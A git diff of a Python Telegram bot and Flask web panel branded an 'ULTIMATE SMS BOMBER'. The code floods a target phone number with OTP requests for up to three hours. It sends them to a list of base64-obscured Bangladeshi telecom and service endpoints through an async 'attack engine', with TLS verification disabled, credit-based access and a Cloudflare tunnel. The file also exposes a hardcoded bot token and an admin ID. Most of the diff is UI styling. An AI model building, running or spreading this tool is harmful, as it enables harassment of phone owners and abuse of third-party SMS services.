@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # ============================================================
-#  MZ MINHAZ - SMS BOMBER (Premium UI + Advanced Admin Panel)
+#  MZ MINHAZ - ULTIMATE SMS BOMBER (Protected Admin Numbers)
 #  Developer: MZ MINHAZ
 #  Admin: 8255204869
 #  Channel: https://t.me/mz_creations_official
@@ -25,6 +25,8 @@ import socket
 import subprocess
 import urllib.request
 import random
+import atexit
+import traceback
 from urllib.parse import parse_qsl
 from flask import Flask, request, jsonify, render_template_string
 from telegram import (
@@ -35,8 +37,9 @@ from telegram.ext import (
     Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
 )
 from telegram.constants import ParseMode
+from telegram.error import Conflict, NetworkError, TimedOut
 
-# ============ CONFIG ============
+# ============ CONFIGURATION ============
 BOT_TOKEN          = "8903303064:AAE9pEU_jevZRXyGRDx0tSAKHXBpXeezW_I"
 ADMIN_ID           = int(os.environ.get("ADMIN_ID", 8255204869))
 CHANNEL_URL        = "https://t.me/mz_creations_official"
@@ -47,13 +50,21 @@ BOMB_DURATION_SEC  = 3 * 60 * 60
 DB_FILE            = os.environ.get("DB_FILE", "mzminhaz.db")
 DEVELOPER_NAME     = "MZ MINHAZ"
 WEBAPP_URL         = os.environ.get("WEBAPP_URL", "")
+TUNNEL_PROCESS     = None
 
-# ============ SSL ============
+# ============ PROTECTED NUMBERS ============
+# যেসব নাম্বারে বোম্বিং করা যাবে না
+PROTECTED_NUMBERS = [
+    "01988890858",
+    "01951813160"
+]
+
+# ============ SSL CONTEXT ============
 _ssl = ssl.create_default_context()
 _ssl.check_hostname = False
 _ssl.verify_mode = ssl.CERT_NONE
 
-# ============ UTILITY ============
+# ============ UTILITY FUNCTIONS ============
 def bd(s):
     return base64.b64decode(s).decode()
 
@@ -105,10 +116,23 @@ def wait_for_server(port, timeout=15):
         time.sleep(0.5)
     return False
 
+def cleanup_tunnel():
+    global TUNNEL_PROCESS
+    if TUNNEL_PROCESS:
+        try:
+            TUNNEL_PROCESS.terminate()
+            TUNNEL_PROCESS.wait(timeout=3)
+            print("[cleanup] Cloudflare tunnel terminated.")
+        except Exception:
+            pass
+
+atexit.register(cleanup_tunnel)
+
 def start_cloudflare_tunnel(port):
+    global TUNNEL_PROCESS
     print(f"[tunnel] Starting Cloudflare tunnel for port {port}...")
     try:
-        process = subprocess.Popen(
+        TUNNEL_PROCESS = subprocess.Popen(
             ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--no-autoupdate"],
             stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
         )
@@ -120,17 +144,17 @@ def start_cloudflare_tunnel(port):
         sys.exit(1)
 
     url_pattern = re.compile(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com')
-    for line in iter(process.stdout.readline, ''):
+    for line in iter(TUNNEL_PROCESS.stdout.readline, ''):
         match = url_pattern.search(line)
         if match:
             url = match.group(0)
-            print(f"[tunnel] ✅ Successfully created tunnel: {url}")
-            return url, process
+            print(f"\n[🚀 SUCCESS] Tunnel created: {url}\n")
+            return url
     print("[ERROR] Failed to get Cloudflare tunnel URL.")
-    process.terminate()
+    cleanup_tunnel()
     sys.exit(1)
 
-# ============ USER AGENTS ============
+# ============ PREMIUM USER AGENTS ============
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
@@ -139,7 +163,7 @@ USER_AGENTS = [
     "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0"
 ]
 
-# ============ API LIST ============
+# ============ EXTENSIVE API LIST ============
 APIS = [
     ["GP WebLogin", "aHR0cHM6Ly93ZWJsb2dpbmRhLmdyYW1lZW5waG9uZS5jb20vYmFja2VuZC9hcGkvdjEvb3Rw", {"msisdn": "z"}],
     ["GP FWA", "aHR0cHM6Ly9ncGZpLWFwaS5ncmFtZWVucGhvbmUuY29tL2FwaS92MS9md2EvcmVxdWVzdC1mb3Itb3Rw", {"phone": "z", "email": "", "language": "en"}],
@@ -163,19 +187,26 @@ APIS = [
     ["Priyoshikkhaloy", "aHR0cHM6Ly9hcHAucHJpeW9zaGlra2hhbG95LmNvbS9hcGkvdXNlci9yZWdpc3Rlci1sb2dpbi5waHA=", {"mobile": "z"}]
 ]
 
-# ============ DATABASE ============
+# ============ ADVANCED DATABASE (WAL Mode) ============
 db_lock = threading.Lock()
 
 def db_init():
     with db_lock:
         con = sqlite3.connect(DB_FILE, timeout=15)
         cur = con.cursor()
+        cur.execute("PRAGMA journal_mode=WAL;")
+        cur.execute("PRAGMA synchronous=NORMAL;")
         cur.executescript("""
             CREATE TABLE IF NOT EXISTS users (
-                chat_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
-                credits INTEGER DEFAULT 0, ref_by INTEGER DEFAULT 0,
-                referred_once INTEGER DEFAULT 0, banned INTEGER DEFAULT 0,
-                joined_at INTEGER, total_attacks INTEGER DEFAULT 0
+                chat_id INTEGER PRIMARY KEY, 
+                username TEXT, 
+                first_name TEXT,
+                credits INTEGER DEFAULT 0, 
+                ref_by INTEGER DEFAULT 0,
+                referred_once INTEGER DEFAULT 0, 
+                banned INTEGER DEFAULT 0,
+                joined_at INTEGER, 
+                total_attacks INTEGER DEFAULT 0
             );
         """)
         con.commit()
@@ -224,7 +255,7 @@ def credits_take(chat_id, n):
         finally:
             con.close()
 
-# ============ ATTACK CORE ============
+# ============ HIGH-SPEED ATTACK ENGINE ============
 bot_attacks = {}
 bot_attack_lock = threading.Lock()
 
@@ -263,7 +294,7 @@ async def _hit(session, api, pd, key, state_dict, lock):
         else:
             async with session.post(url, headers=headers, json=data, ssl=_ssl, timeout=7) as r:
                 ok = r.status in (200, 201, 202, 204, 302)
-    except:
+    except Exception:
         ok = False
     finally:
         with lock:
@@ -301,6 +332,8 @@ async def _runner(phone, delay, key, state_dict, lock, end_time=None):
                 await _cycle(session, pd, key, state_dict, lock)
                 if delay > 0:
                     await asyncio.sleep(delay)
+    except Exception as e:
+        print(f"[ATTACK ERROR] {e}")
     finally:
         with lock:
             st = state_dict.get(key)
@@ -318,7 +351,7 @@ def _spawn(phone, speed, key, state_dict, lock, end_time=None):
             loop.close()
     threading.Thread(target=worker, daemon=True).start()
 
-# ============ FLASK PANEL ============
+# ============ FLASK WEB APP ============
 app = Flask(__name__)
 
 HTML_TEMPLATE = r"""
@@ -340,588 +373,223 @@ HTML_TEMPLATE = r"""
     --green-soft: #14a842;
     --cyan: #00ffd0;
     --red: #ff3b3b;
-    --red-soft: #a82222;
     --yellow: #ffcc00;
     --text: #d8ffe0;
     --muted: #4a7a5a;
     --shadow: 0 20px 60px rgba(0, 255, 65, 0.12);
   }
   html, body {
-    min-height: 100vh;
-    background: var(--bg);
-    color: var(--text);
-    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-    overflow-x: hidden;
-    overscroll-behavior: none;
+    min-height: 100vh; background: var(--bg); color: var(--text);
+    font-family: 'Inter', -apple-system, sans-serif;
+    overflow-x: hidden; overscroll-behavior: none;
   }
-  #matrix {
-    position: fixed; inset: 0;
-    z-index: 0; pointer-events: none;
-    opacity: 0.55;
-  }
+  #matrix { position: fixed; inset: 0; z-index: 0; pointer-events: none; opacity: 0.55; }
   .bg-glow {
     position: fixed; inset: 0; z-index: 0; pointer-events: none;
-    background:
-      radial-gradient(circle at 20% 10%, rgba(0,255,65,0.10) 0%, transparent 45%),
-      radial-gradient(circle at 80% 90%, rgba(0,255,208,0.08) 0%, transparent 50%);
+    background: radial-gradient(circle at 20% 10%, rgba(0,255,65,0.1) 0%, transparent 45%),
+                radial-gradient(circle at 80% 90%, rgba(0,255,208,0.08) 0%, transparent 50%);
   }
 
-  /* ====== LOADER ====== */
+  /* LOADER */
   #loader {
-    position: fixed; inset: 0; z-index: 9999;
-    display: flex; flex-direction: column; align-items: center; justify-content: center;
-    background: var(--bg); gap: 24px;
+    position: fixed; inset: 0; z-index: 9999; display: flex; flex-direction: column;
+    align-items: center; justify-content: center; background: var(--bg); gap: 24px;
     transition: opacity .5s ease;
   }
   #loader.hide { opacity: 0; pointer-events: none; }
   .spinner {
-    width: 56px; height: 56px;
-    border: 3px solid rgba(0,255,65,0.15);
-    border-top-color: var(--green);
-    border-radius: 50%;
-    animation: spin 0.9s linear infinite;
-    box-shadow: 0 0 30px rgba(0,255,65,0.3);
+    width: 56px; height: 56px; border: 3px solid rgba(0,255,65,0.15);
+    border-top-color: var(--green); border-radius: 50%;
+    animation: spin 0.9s linear infinite; box-shadow: 0 0 30px rgba(0,255,65,0.3);
   }
   @keyframes spin { to { transform: rotate(360deg); } }
   .load-text {
-    font-family: 'Courier New', monospace;
-    color: var(--green);
-    letter-spacing: 4px;
-    font-size: 12px;
-    font-weight: 700;
-    animation: blink 1.4s infinite;
+    font-family: 'Courier New', monospace; color: var(--green);
+    letter-spacing: 4px; font-size: 12px; font-weight: 700; animation: blink 1.4s infinite;
   }
   @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
 
-  /* ====== APP ====== */
+  /* APP */
   .app {
-    position: relative; z-index: 2;
-    max-width: 480px;
-    margin: 0 auto;
-    padding: 20px 18px 100px;
-    min-height: 100vh;
-    display: flex; flex-direction: column; gap: 18px;
+    position: relative; z-index: 2; max-width: 480px; margin: 0 auto;
+    padding: 20px 18px 100px; min-height: 100vh; display: flex; flex-direction: column; gap: 18px;
   }
 
-  /* ====== HEADER ====== */
-  .top-bar {
-    display: flex; justify-content: space-between; align-items: center;
-  }
+  /* HEADER */
+  .top-bar { display: flex; justify-content: space-between; align-items: center; }
   .credits-pill {
-    display: flex; align-items: center; gap: 8px;
-    padding: 10px 16px;
+    display: flex; align-items: center; gap: 8px; padding: 10px 16px;
     background: linear-gradient(135deg, rgba(0,255,65,0.15), rgba(0,255,208,0.08));
-    border: 1px solid var(--border);
-    border-radius: 100px;
-    backdrop-filter: blur(20px);
-    box-shadow: 0 8px 30px rgba(0,255,65,0.15);
+    border: 1px solid var(--border); border-radius: 100px;
+    backdrop-filter: blur(20px); box-shadow: 0 8px 30px rgba(0,255,65,0.15);
   }
   .credits-pill .icon { font-size: 18px; }
   .credits-pill .val {
-    font-family: 'Courier New', monospace;
-    font-weight: 800;
-    font-size: 18px;
-    color: var(--green);
-    text-shadow: 0 0 20px rgba(0,255,65,0.6);
-    min-width: 20px;
-    transition: transform .3s;
+    font-family: 'Courier New', monospace; font-weight: 800; font-size: 18px;
+    color: var(--green); text-shadow: 0 0 20px rgba(0,255,65,0.6);
+    min-width: 20px; transition: transform .3s;
   }
   .credits-pill .val.bump { transform: scale(1.35); }
   .credits-pill .lbl {
-    font-size: 10px;
-    color: var(--muted);
-    text-transform: uppercase;
-    letter-spacing: 2px;
-    font-weight: 700;
+    font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: 2px; font-weight: 700;
   }
   .close-btn {
-    width: 42px; height: 42px;
-    display: flex; align-items: center; justify-content: center;
-    background: rgba(255,59,59,0.08);
-    border: 1px solid rgba(255,59,59,0.3);
-    border-radius: 50%;
-    color: var(--red);
-    font-size: 20px;
-    cursor: pointer;
-    transition: all .2s;
+    width: 42px; height: 42px; display: flex; align-items: center; justify-content: center;
+    background: rgba(255,59,59,0.08); border: 1px solid rgba(255,59,59,0.3);
+    border-radius: 50%; color: var(--red); font-size: 20px; cursor: pointer; transition: all .2s;
   }
   .close-btn:active { transform: scale(0.9); background: rgba(255,59,59,0.2); }
 
-  /* ====== BRAND ====== */
+  /* BRAND */
   .brand { text-align: center; padding: 8px 0 6px; }
   .brand h1 {
-    font-family: 'Courier New', monospace;
-    font-size: 34px;
-    font-weight: 900;
-    color: var(--green);
-    letter-spacing: 4px;
-    text-shadow:
-      0 0 10px rgba(0,255,65,0.8),
-      0 0 30px rgba(0,255,65,0.5),
-      0 0 60px rgba(0,255,65,0.3);
+    font-family: 'Courier New', monospace; font-size: 34px; font-weight: 900;
+    color: var(--green); letter-spacing: 4px;
+    text-shadow: 0 0 10px rgba(0,255,65,0.8), 0 0 30px rgba(0,255,65,0.5), 0 0 60px rgba(0,255,65,0.3);
     animation: glow 3s ease-in-out infinite;
   }
   @keyframes glow {
     0%,100% { text-shadow: 0 0 10px rgba(0,255,65,0.8), 0 0 30px rgba(0,255,65,0.5), 0 0 60px rgba(0,255,65,0.3); }
     50% { text-shadow: 0 0 20px rgba(0,255,65,1), 0 0 50px rgba(0,255,65,0.7), 0 0 90px rgba(0,255,65,0.5); }
   }
-  .brand .tagline {
-    font-size: 11px;
-    letter-spacing: 5px;
-    color: var(--muted);
-    text-transform: uppercase;
-    margin-top: 6px;
-    font-weight: 600;
-  }
-  .brand .divider {
-    height: 1px; width: 60px; margin: 14px auto 0;
-    background: linear-gradient(90deg, transparent, var(--green), transparent);
-    box-shadow: 0 0 15px var(--green);
-  }
+  .brand .tagline { font-size: 11px; letter-spacing: 5px; color: var(--muted); text-transform: uppercase; margin-top: 6px; font-weight: 600; }
+  .brand .divider { height: 1px; width: 60px; margin: 14px auto 0; background: linear-gradient(90deg, transparent, var(--green), transparent); box-shadow: 0 0 15px var(--green); }
 
-  /* ====== CARD ====== */
+  /* CARD */
   .card {
-    background: var(--panel);
-    backdrop-filter: blur(24px);
-    -webkit-backdrop-filter: blur(24px);
-    border: 1px solid var(--border);
-    border-radius: 24px;
-    padding: 22px 20px;
+    background: var(--panel); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px);
+    border: 1px solid var(--border); border-radius: 24px; padding: 22px 20px;
     box-shadow: var(--shadow), inset 0 1px 0 rgba(255,255,255,0.03);
-    position: relative;
-    overflow: hidden;
+    position: relative; overflow: hidden;
   }
   .card::before {
-    content: '';
-    position: absolute; top: 0; left: -100%;
-    width: 100%; height: 100%;
+    content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%;
     background: linear-gradient(90deg, transparent, rgba(0,255,65,0.05), transparent);
     animation: shine 8s infinite;
   }
-  @keyframes shine {
-    0% { left: -100%; }
-    50%,100% { left: 100%; }
-  }
-
-  .label {
-    display: flex; align-items: center; gap: 8px;
-    font-size: 11px;
-    color: var(--muted);
-    text-transform: uppercase;
-    letter-spacing: 2px;
-    font-weight: 700;
-    margin-bottom: 12px;
-  }
+  @keyframes shine { 0% { left: -100%; } 50%,100% { left: 100%; } }
+  .label { display: flex; align-items: center; gap: 8px; font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: 2px; font-weight: 700; margin-bottom: 12px; }
   .label .ico { font-size: 15px; filter: drop-shadow(0 0 6px rgba(0,255,65,0.5)); }
 
-  /* ====== PHONE INPUT ====== */
+  /* PHONE INPUT & PASTE */
   .phone-wrap {
-    position: relative;
-    display: flex; align-items: center;
-    background: rgba(0, 20, 5, 0.7);
-    border: 1.5px solid rgba(0,255,65,0.3);
-    border-radius: 16px;
-    padding: 4px 6px;
-    transition: all .25s;
+    position: relative; display: flex; align-items: center;
+    background: rgba(0, 20, 5, 0.7); border: 1.5px solid rgba(0,255,65,0.3);
+    border-radius: 16px; padding: 4px 6px; transition: all .25s;
   }
-  .phone-wrap:focus-within {
-    border-color: var(--green);
-    box-shadow: 0 0 0 3px rgba(0,255,65,0.12), 0 0 30px rgba(0,255,65,0.25);
-  }
-  .phone-prefix {
-    padding: 12px 14px;
-    color: var(--green);
-    font-family: 'Courier New', monospace;
-    font-weight: 800;
-    font-size: 16px;
-    border-right: 1px solid rgba(0,255,65,0.2);
-    margin-right: 4px;
-  }
-  #phone {
-    flex: 1;
-    background: transparent;
-    border: none;
-    outline: none;
-    color: var(--text);
-    font-family: 'Courier New', monospace;
-    font-size: 17px;
-    font-weight: 700;
-    letter-spacing: 2px;
-    padding: 12px 8px;
-    width: 100%;
-  }
+  .phone-wrap:focus-within { border-color: var(--green); box-shadow: 0 0 0 3px rgba(0,255,65,0.12), 0 0 30px rgba(0,255,65,0.25); }
+  .phone-prefix { padding: 12px 14px; color: var(--green); font-family: 'Courier New', monospace; font-weight: 800; font-size: 16px; border-right: 1px solid rgba(0,255,65,0.2); margin-right: 4px; }
+  #phone { flex: 1; background: transparent; border: none; outline: none; color: var(--text); font-family: 'Courier New', monospace; font-size: 17px; font-weight: 700; letter-spacing: 2px; padding: 12px 8px; width: 100%; }
   #phone::placeholder { color: var(--muted); letter-spacing: 1px; font-weight: 400; }
-
-  /* ====== SPEED PILLS ====== */
-  .speed-pills {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    gap: 8px;
-  }
-  .speed-pill {
-    display: flex; flex-direction: column; align-items: center; gap: 4px;
-    padding: 12px 6px;
-    background: rgba(0, 20, 5, 0.6);
-    border: 1.5px solid rgba(0,255,65,0.2);
-    border-radius: 14px;
+  
+  .paste-btn {
+    background: rgba(0,255,65,0.1);
+    border: 1px solid rgba(0,255,65,0.3);
+    color: var(--green);
+    border-radius: 10px;
+    padding: 10px 14px;
+    font-size: 13px;
+    font-weight: 700;
     cursor: pointer;
-    transition: all .25s;
+    transition: all 0.2s;
+    margin-right: 4px;
     font-family: 'Courier New', monospace;
+    display: flex; align-items: center; gap: 4px;
+  }
+  .paste-btn:active { transform: scale(0.95); background: rgba(0,255,65,0.2); }
+
+  /* SPEED PILLS */
+  .speed-pills { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
+  .speed-pill {
+    display: flex; flex-direction: column; align-items: center; gap: 4px; padding: 12px 6px;
+    background: rgba(0, 20, 5, 0.6); border: 1.5px solid rgba(0,255,65,0.2);
+    border-radius: 14px; cursor: pointer; transition: all .25s; font-family: 'Courier New', monospace;
   }
   .speed-pill .emoji { font-size: 20px; transition: transform .3s; }
-  .speed-pill .name {
-    font-size: 11px;
-    font-weight: 800;
-    color: var(--muted);
-    letter-spacing: 1px;
-    text-transform: uppercase;
-    transition: color .25s;
-  }
-  .speed-pill .time {
-    font-size: 9px;
-    color: rgba(74,122,90,0.6);
-    letter-spacing: 0.5px;
-  }
-  .speed-pill.active {
-    background: linear-gradient(135deg, rgba(0,255,65,0.2), rgba(0,255,208,0.1));
-    border-color: var(--green);
-    box-shadow: 0 0 20px rgba(0,255,65,0.3);
-  }
+  .speed-pill .name { font-size: 11px; font-weight: 800; color: var(--muted); letter-spacing: 1px; text-transform: uppercase; transition: color .25s; }
+  .speed-pill .time { font-size: 9px; color: rgba(74,122,90,0.6); letter-spacing: 0.5px; }
+  .speed-pill.active { background: linear-gradient(135deg, rgba(0,255,65,0.2), rgba(0,255,208,0.1)); border-color: var(--green); box-shadow: 0 0 20px rgba(0,255,65,0.3); }
   .speed-pill.active .emoji { transform: scale(1.15); }
   .speed-pill.active .name { color: var(--green); text-shadow: 0 0 10px rgba(0,255,65,0.6); }
   .speed-pill.active .time { color: var(--cyan); }
   .speed-pill:active { transform: scale(0.96); }
 
-  /* ====== MAIN ACTION BUTTON ====== */
+  /* MAIN ACTION BUTTON */
   .action-btn {
-    width: 100%;
-    padding: 20px;
-    border: none;
-    border-radius: 20px;
-    background: linear-gradient(135deg, #00ff41, #00cc33);
-    color: #000;
-    font-family: 'Courier New', monospace;
-    font-size: 17px;
-    font-weight: 900;
-    letter-spacing: 2px;
-    text-transform: uppercase;
-    cursor: pointer;
-    position: relative;
-    overflow: hidden;
-    box-shadow:
-      0 10px 30px rgba(0,255,65,0.4),
-      inset 0 -3px 0 rgba(0,0,0,0.2),
-      inset 0 1px 0 rgba(255,255,255,0.3);
-    transition: all .25s;
-    display: flex; align-items: center; justify-content: center; gap: 10px;
+    width: 100%; padding: 20px; border: none; border-radius: 20px;
+    background: linear-gradient(135deg, #00ff41, #00cc33); color: #000;
+    font-family: 'Courier New', monospace; font-size: 17px; font-weight: 900;
+    letter-spacing: 2px; text-transform: uppercase; cursor: pointer; position: relative; overflow: hidden;
+    box-shadow: 0 10px 30px rgba(0,255,65,0.4), inset 0 -3px 0 rgba(0,0,0,0.2), inset 0 1px 0 rgba(255,255,255,0.3);
+    transition: all .25s; display: flex; align-items: center; justify-content: center; gap: 10px;
   }
-  .action-btn::before {
-    content: '';
-    position: absolute; top: 50%; left: 50%;
-    width: 0; height: 0;
-    background: rgba(255,255,255,0.4);
-    border-radius: 50%;
-    transform: translate(-50%, -50%);
-    transition: width .6s, height .6s;
-  }
+  .action-btn::before { content: ''; position: absolute; top: 50%; left: 50%; width: 0; height: 0; background: rgba(255,255,255,0.4); border-radius: 50%; transform: translate(-50%, -50%); transition: width .6s, height .6s; }
   .action-btn:active::before { width: 300px; height: 300px; }
   .action-btn:active { transform: scale(0.97); box-shadow: 0 5px 15px rgba(0,255,65,0.3); }
-  .action-btn:disabled {
-    background: linear-gradient(135deg, #1a3322, #142618);
-    color: var(--muted);
-    cursor: not-allowed;
-    box-shadow: none;
-    transform: none;
-  }
-  .action-btn.stop {
-    background: linear-gradient(135deg, #ff3b3b, #cc2222);
-    color: #fff;
-    box-shadow: 0 10px 30px rgba(255,59,59,0.4), inset 0 -3px 0 rgba(0,0,0,0.2);
-  }
+  .action-btn:disabled { background: linear-gradient(135deg, #1a3322, #142618); color: var(--muted); cursor: not-allowed; box-shadow: none; transform: none; }
+  .action-btn.stop { background: linear-gradient(135deg, #ff3b3b, #cc2222); color: #fff; box-shadow: 0 10px 30px rgba(255,59,59,0.4), inset 0 -3px 0 rgba(0,0,0,0.2); }
 
-  /* ====== STATS ====== */
-  .stats-grid {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    gap: 8px;
-  }
-  .stat-card {
-    background: rgba(0, 20, 5, 0.7);
-    border: 1px solid rgba(0,255,65,0.15);
-    border-radius: 14px;
-    padding: 14px 6px;
-    text-align: center;
-    position: relative;
-    overflow: hidden;
-  }
-  .stat-card::after {
-    content: '';
-    position: absolute; top: 0; left: 0; right: 0; height: 2px;
-    background: var(--accent, var(--green));
-    box-shadow: 0 0 15px var(--accent, var(--green));
-    opacity: 0.6;
-  }
+  /* STATS */
+  .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
+  .stat-card { background: rgba(0, 20, 5, 0.7); border: 1px solid rgba(0,255,65,0.15); border-radius: 14px; padding: 14px 6px; text-align: center; position: relative; overflow: hidden; }
+  .stat-card::after { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px; background: var(--accent, var(--green)); box-shadow: 0 0 15px var(--accent, var(--green)); opacity: 0.6; }
   .stat-card.total { --accent: var(--cyan); }
   .stat-card.ok { --accent: var(--green); }
   .stat-card.fail { --accent: var(--red); }
-  .stat-val {
-    font-family: 'Courier New', monospace;
-    font-size: 24px;
-    font-weight: 900;
-    line-height: 1;
-    color: var(--accent, var(--green));
-    text-shadow: 0 0 15px var(--accent, var(--green));
-    transition: transform .3s;
-    display: block;
-    margin-bottom: 6px;
-  }
+  .stat-val { font-family: 'Courier New', monospace; font-size: 24px; font-weight: 900; line-height: 1; color: var(--accent, var(--green)); text-shadow: 0 0 15px var(--accent, var(--green)); transition: transform .3s; display: block; margin-bottom: 6px; }
   .stat-val.bump { transform: scale(1.2); }
-  .stat-lbl {
-    font-size: 9px;
-    text-transform: uppercase;
-    letter-spacing: 1.5px;
-    color: var(--muted);
-    font-weight: 700;
-  }
+  .stat-lbl { font-size: 9px; text-transform: uppercase; letter-spacing: 1.5px; color: var(--muted); font-weight: 700; }
 
-  /* ====== TIMER / PROGRESS ====== */
-  #attackInfo {
-    display: none;
-    padding: 16px 18px;
-    background: linear-gradient(135deg, rgba(0,255,65,0.08), rgba(0,255,208,0.03));
-    border: 1px solid rgba(0,255,65,0.3);
-    border-radius: 16px;
-    animation: slideIn .4s ease-out;
-  }
+  /* TIMER */
+  #attackInfo { display: none; padding: 16px 18px; background: linear-gradient(135deg, rgba(0,255,65,0.08), rgba(0,255,208,0.03)); border: 1px solid rgba(0,255,65,0.3); border-radius: 16px; animation: slideIn .4s ease-out; }
   #attackInfo.show { display: block; }
   @keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
-  .timer-row {
-    display: flex; justify-content: space-between; align-items: center;
-    margin-bottom: 10px;
-  }
-  .timer-lbl {
-    font-size: 10px;
-    letter-spacing: 2px;
-    color: var(--muted);
-    text-transform: uppercase;
-    font-weight: 700;
-  }
-  .timer-val {
-    font-family: 'Courier New', monospace;
-    font-size: 18px;
-    font-weight: 900;
-    color: var(--cyan);
-    text-shadow: 0 0 20px rgba(0,255,208,0.7);
-    letter-spacing: 1px;
-  }
-  .progress-track {
-    height: 6px;
-    background: rgba(0,0,0,0.5);
-    border-radius: 100px;
-    overflow: hidden;
-    border: 1px solid rgba(0,255,65,0.2);
-  }
-  .progress-fill {
-    height: 100%;
-    background: linear-gradient(90deg, var(--green), var(--cyan));
-    border-radius: 100px;
-    transition: width 1s linear;
-    box-shadow: 0 0 15px var(--green);
-    position: relative;
-  }
-  .progress-fill::after {
-    content: '';
-    position: absolute; top: 0; left: 0; right: 0; bottom: 0;
-    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
-    animation: shimmer 2s infinite;
-  }
+  .timer-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+  .timer-lbl { font-size: 10px; letter-spacing: 2px; color: var(--muted); text-transform: uppercase; font-weight: 700; }
+  .timer-val { font-family: 'Courier New', monospace; font-size: 18px; font-weight: 900; color: var(--cyan); text-shadow: 0 0 20px rgba(0,255,208,0.7); letter-spacing: 1px; }
+  .progress-track { height: 6px; background: rgba(0,0,0,0.5); border-radius: 100px; overflow: hidden; border: 1px solid rgba(0,255,65,0.2); }
+  .progress-fill { height: 100%; background: linear-gradient(90deg, var(--green), var(--cyan)); border-radius: 100px; transition: width 1s linear; box-shadow: 0 0 15px var(--green); position: relative; }
+  .progress-fill::after { content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent); animation: shimmer 2s infinite; }
   @keyframes shimmer { from { transform: translateX(-100%); } to { transform: translateX(100%); } }
 
-  /* ====== STATUS BAR ====== */
-  .status-bar {
-    display: flex; align-items: center; justify-content: center; gap: 10px;
-    padding: 14px;
-    background: rgba(0, 20, 5, 0.5);
-    border: 1px solid rgba(0,255,65,0.15);
-    border-radius: 16px;
-    font-family: 'Courier New', monospace;
-    font-size: 12px;
-    font-weight: 700;
-    letter-spacing: 2px;
-    text-transform: uppercase;
-    color: var(--muted);
-  }
-  .status-dot {
-    width: 10px; height: 10px;
-    border-radius: 50%;
-    background: var(--muted);
-    box-shadow: 0 0 10px currentColor;
-    transition: all .3s;
-  }
-  .status-bar.running .status-dot {
-    background: var(--green);
-    color: var(--green);
-    animation: pulseDot 1.2s infinite;
-  }
-  .status-bar.running {
-    color: var(--green);
-    text-shadow: 0 0 10px rgba(0,255,65,0.5);
-  }
-  @keyframes pulseDot {
-    0%,100% { box-shadow: 0 0 10px var(--green), 0 0 20px var(--green); }
-    50% { box-shadow: 0 0 25px var(--green), 0 0 40px var(--green); }
-  }
+  /* STATUS */
+  .status-bar { display: flex; align-items: center; justify-content: center; gap: 10px; padding: 14px; background: rgba(0, 20, 5, 0.5); border: 1px solid rgba(0,255,65,0.15); border-radius: 16px; font-family: 'Courier New', monospace; font-size: 12px; font-weight: 700; letter-spacing: 2px; text-transform: uppercase; color: var(--muted); }
+  .status-dot { width: 10px; height: 10px; border-radius: 50%; background: var(--muted); box-shadow: 0 0 10px currentColor; transition: all .3s; }
+  .status-bar.running .status-dot { background: var(--green); color: var(--green); animation: pulseDot 1.2s infinite; }
+  .status-bar.running { color: var(--green); text-shadow: 0 0 10px rgba(0,255,65,0.5); }
+  @keyframes pulseDot { 0%,100% { box-shadow: 0 0 10px var(--green), 0 0 20px var(--green); } 50% { box-shadow: 0 0 25px var(--green), 0 0 40px var(--green); } }
 
-  /* ====== TOAST ====== */
-  #toastBox {
-    position: fixed;
-    top: 20px; left: 50%; transform: translateX(-50%);
-    z-index: 10000;
-    display: flex; flex-direction: column; gap: 10px;
-    pointer-events: none;
-    max-width: 90%;
-  }
-  .toast {
-    padding: 14px 22px;
-    border-radius: 14px;
-    font-family: 'Courier New', monospace;
-    font-size: 13px;
-    font-weight: 700;
-    letter-spacing: 0.5px;
-    backdrop-filter: blur(20px);
-    animation: toastIn .35s ease-out, toastOut .35s ease-in 2.65s;
-    box-shadow: 0 10px 40px rgba(0,0,0,0.5);
-    border: 1px solid;
-    text-align: center;
-  }
-  .toast.error {
-    background: rgba(255,59,59,0.15);
-    border-color: rgba(255,59,59,0.5);
-    color: #ff8a8a;
-    box-shadow: 0 10px 40px rgba(255,59,59,0.3);
-  }
-  .toast.success {
-    background: rgba(0,255,65,0.15);
-    border-color: rgba(0,255,65,0.5);
-    color: var(--green);
-    box-shadow: 0 10px 40px rgba(0,255,65,0.3);
-  }
-  .toast.info {
-    background: rgba(0,255,208,0.12);
-    border-color: rgba(0,255,208,0.4);
-    color: var(--cyan);
-  }
+  /* TOAST */
+  #toastBox { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); z-index: 10000; display: flex; flex-direction: column; gap: 10px; pointer-events: none; max-width: 90%; }
+  .toast { padding: 14px 22px; border-radius: 14px; font-family: 'Courier New', monospace; font-size: 13px; font-weight: 700; letter-spacing: 0.5px; backdrop-filter: blur(20px); animation: toastIn .35s ease-out, toastOut .35s ease-in 2.65s; box-shadow: 0 10px 40px rgba(0,0,0,0.5); border: 1px solid; text-align: center; }
